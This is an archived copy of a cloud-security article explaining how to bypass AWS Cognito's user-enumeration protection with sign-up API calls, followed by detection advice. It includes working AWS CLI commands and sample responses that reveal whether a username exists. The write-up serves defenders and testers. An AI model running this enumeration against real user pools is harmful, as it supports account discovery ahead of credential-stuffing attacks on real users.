---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-01-08_bypass-cognito-account-enumeration-controls.md
original_filename: 2024-01-08_bypass-cognito-account-enumeration-controls.md
title: Bypass Cognito Account Enumeration Controls
category: documents
detected_topics:
- sso
- idor
- command-injection
- rate-limit
- cloud-security
- mobile-security
tags:
- imported
- documents
- sso
- idor
- command-injection
- rate-limit
- cloud-security
- mobile-security
language: en
raw_sha256: 92c95ad1c2688a10904601f469e9b59bb0d4fd11c73636b6e01bc30806f4791f
text_sha256: a222ec64dd8ef78f4531bdacd71b4979fee724d5d272e9351632270abaa8188b
ingested_at: '2026-06-28T07:32:29Z'
sensitivity: unknown
redactions_applied: true
---

# Bypass Cognito Account Enumeration Controls

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-01-08_bypass-cognito-account-enumeration-controls.md
- Source Type: markdown
- Detected Topics: sso, idor, command-injection, rate-limit, cloud-security, mobile-security
- Ingested At: 2026-06-28T07:32:29Z
- Redactions Applied: True
- Raw SHA256: `92c95ad1c2688a10904601f469e9b59bb0d4fd11c73636b6e01bc30806f4791f`
- Text SHA256: `a222ec64dd8ef78f4531bdacd71b4979fee724d5d272e9351632270abaa8188b`


## Content

---
title: "Bypass Cognito Account Enumeration Controls"
page_title: "Bypass Cognito Account Enumeration Controls - Hacking The Cloud"
url: "https://hackingthe.cloud/aws/enumeration/bypass_cognito_user_enumeration_controls/"
final_url: "https://hackingthe.cloud/aws/enumeration/bypass_cognito_user_enumeration_controls/"
authors: ["Nick Frichette (@frichette_n)"]
programs: ["AWS"]
bugs: ["Username enumeration"]
publication_date: "2024-01-08"
added_date: "2024-01-10"
source: "pentester.land/writeups.json"
original_index: 573
---

Article by Nick Frichette

[ ](https://github.com/Hacking-the-Cloud/hackingthe.cloud/edit/main/content/aws/enumeration/bypass_cognito_user_enumeration_controls.md "Edit this page")

# Bypass Cognito Account Enumeration Controls

  * **Additional Resources**

* * *

AWS Docs: [Managing user existence error responses](https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-pool-managing-errors.html)

Amazon [Cognito](https://aws.amazon.com/cognito/) is a popular “sign-in as a service” offering from AWS. It allows developers to push the responsibility of developing authentication, sign up, and secure credential storage to AWS so they can instead focus on building their app.

By default, Cognito will set a configuration called `Prevent user existence errors`. This is designed to prevent adversaries from [enumerating accounts](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account) and using that information for further attacks, such as [credential stuffing](https://owasp.org/www-community/attacks/Credential_stuffing).

While this is useful in theory, and a good default to have, it can be bypassed via [cognito-idp:SignUp](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cognito-idp/sign-up.html) calls for usernames. This bypass was originally reported via a GitHub [issue](https://github.com/aws-amplify/amplify-js/issues/6238) in July 2020 and Cognito is still vulnerable as of early 2024.

Note

Cognito user pools can be configured to prevent disclosing user existence errors via [alias attributes](https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-pool-managing-errors.html#cognito-user-pool-managing-errors-prevent-userexistence-errors) for email addresses and phone numbers, but not usernames. Be mindful that the 'Prevent user existence errors' setting does not cover all scenarios as detailed below. 

## Example Responses¶

To demonstrate the responses depending on the configuration and if a user does/does not exist, here are some examples. The `admin` user exists in the user pool and is the account we will be trying to enumerate.

Note

The `client-id` value for a Cognito User Pool is not secret and is accessible from the JavaScript served by the client. 

### Prevent user existence errors on and user exists¶
  
  
  $ aws cognito-idp initiate-auth \
  --auth-flow USER_PASSWORD_AUTH \
  --client-id 719… \
  --auth-parameters USERNAME=admin,PASSWORD=***REDACTED***
  
  An error occurred (NotAuthorizedException) when calling the InitiateAuth operation: Incorrect username or password.
  

### Prevent user existence errors on and user does not exist¶
  
  
  $ aws cognito-idp initiate-auth \
  --auth-flow USER_PASSWORD_AUTH \
  --client-id 719… \
  --auth-parameters USERNAME=notreal,PASSWORD=***REDACTED***
  
  An error occurred (NotAuthorizedException) when calling the InitiateAuth operation: Incorrect username or password.
  

### Prevent user existence errors off and user exists¶
  
  
  $ aws cognito-idp initiate-auth \
  --auth-flow USER_PASSWORD_AUTH \
  --client-id 719… \
  --auth-parameters USERNAME=admin,PASSWORD=***REDACTED***
  
  An error occurred (NotAuthorizedException) when calling the InitiateAuth operation: Incorrect username or password.
  

### Prevent user existence errors off and user does not exist¶
  
  
  $ aws cognito-idp initiate-auth \
  --auth-flow USER_PASSWORD_AUTH \
  --client-id 719… \
  --auth-parameters USERNAME=notreal,PASSWORD=***REDACTED***
  
  An error occurred (UserNotFoundException) when calling the InitiateAuth operation: User does not exist.
  

As you can see, an adversary can use the `UserNotFoundException` and `NotAuthorizedException` to enumerate whether an account does or does not exist. By enabling the `Prevent user existence errors` configuration, defenders can successfully mitigate these types of attacks. However we will show how it can be bypassed.

## cognito-idp:SignUp¶

The `Prevent user existence errors` configuration appears to only impact the `initiate-auth` flow. It does not impact [cognito-idp:SignUp](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cognito-idp/sign-up.html). Because of this we can use this API call to enumerate if a user does or does not exist. Please see the following examples:

### Prevent user existence errors on and user exists¶
  
  
  $ aws cognito-idp sign-up \
  --client-id 719... \
  --username admin \
  --password "BlahBlah123!" \
  --user-attributes Name=email,Value="[[email protected]](/cdn-cgi/l/email-protection)"
  
  An error occurred (UsernameExistsException) when calling the SignUp operation: User already exists
  

### Prevent user existence errors on and user does not exist¶
  
  
  $ aws cognito-idp sign-up \
  --client-id 719... \
  --username notreal \
  --password "BlahBlah123!" \
  --user-attributes Name=email,Value="[[email protected]](/cdn-cgi/l/email-protection)"
  {
  "UserConfirmed": false,
  "CodeDeliveryDetails": {
  "Destination": "b***@b***",
  "DeliveryMedium": "EMAIL",
  "AttributeName": "email"
  },
  "UserSub": "a20…"
  }
  

## Detection Opportunities¶

If an adversary is using this technique at scale to identify what accounts exist in your user pool, you can attempt to detect this behavior by alerting on a sudden increase in `Unconfirmed` user accounts.

[![User Pool Identities](../../../images/aws/enumeration/bypass_cognito_user_enumeration_controls/user_pool_identities.png)](../../../images/aws/enumeration/bypass_cognito_user_enumeration_controls/user_pool_identities.png)

Depending on the configuration of your user pool, an adversary could attempt to get around this by using a real email address to confirm the user name.

### CloudTrail and CloudWatch Limitations¶

If you attempt to build detections around this using CloudTrail or CloudWatch, you will run into challenges. This is because a significant portion of useful telemetry (basically all of it) is omitted in these logs. For example, the `userIdentity` who made the API call is `Anonymous`
  
  
  {
  "eventVersion": "1.08",
  "userIdentity": {
  "type": "Unknown",
  "principalId": "Anonymous"
  }
  

And the `username` and `userAttributes` are hidden:
  
  
  "requestParameters": {
  "clientId": "719...",
  "username": "HIDDEN_DUE_TO_SECURITY_REASONS",
  "password": "HIDDEN_DUE_TO_SECURITY_REASONS",
  "userAttributes": "HIDDEN_DUE_TO_SECURITY_REASONS"
  }
  

For this reason, you can use CloudTrail or CloudWatch to track the number of [cognito-idp:SignUp](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cognito-idp/sign-up.html) calls, and their associated `sourceIPAddress`, but not access their details. 

January 8, 2024 January 7, 2024 GitHub [ ![Frichetten](https://avatars.githubusercontent.com/u/10386884?v=4&size=72) ](https://github.com/Frichetten "@Frichetten") [ ![web-flow](https://avatars.githubusercontent.com/u/19864447?v=4&size=72) ](https://github.com/web-flow "@web-flow")
